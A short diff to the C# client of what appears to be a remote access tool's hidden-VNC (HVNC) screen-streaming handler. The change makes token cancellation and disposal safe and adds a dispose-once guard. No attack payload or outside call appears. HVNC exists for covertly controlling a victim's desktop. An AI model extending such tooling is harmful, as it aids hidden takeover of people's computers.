@@ -15,6 +15,7 @@ using Pulsar.Common.Messages.Other;
 using Pulsar.Common.Networking;
 using Pulsar.Common.Video;
 using Pulsar.Common.Video.Codecs;
+using Pulsar.Common.Extensions;
 
 namespace Pulsar.Client.Messages
 {
@@ -124,7 +125,7 @@ namespace Pulsar.Client.Messages
 
         private void StopScreenStreaming()
         {
-            _cancellationTokenSource?.Cancel();
+            _cancellationTokenSource.CancelSafe();
 
             if (_captureThread != null && _captureThread.IsAlive)
             {
@@ -354,18 +355,21 @@ namespace Pulsar.Client.Messages
             GC.SuppressFinalize(this);
         }
 
+        private bool _disposed;
+
         protected virtual void Dispose(bool disposing)
         {
-            if (disposing)
-            {
-                Debug.WriteLine("HVNC Handler Disposed");
-                StopScreenStreaming();
-                ImageHandler.Dispose();
-                InputHandler.Dispose();
-                _streamCodec?.Dispose();
-                _cancellationTokenSource?.Dispose();
-                _frameRequestEvent?.Dispose();
-            }
+            if (!disposing || _disposed)
+                return;
+
+            _disposed = true;
+            Debug.WriteLine("HVNC Handler Disposed");
+            StopScreenStreaming();
+            ImageHandler.Dispose();
+            InputHandler.Dispose();
+            _streamCodec?.Dispose();
+            _cancellationTokenSource.DisposeSafe();
+            _frameRequestEvent?.Dispose();
         }
     }
 }
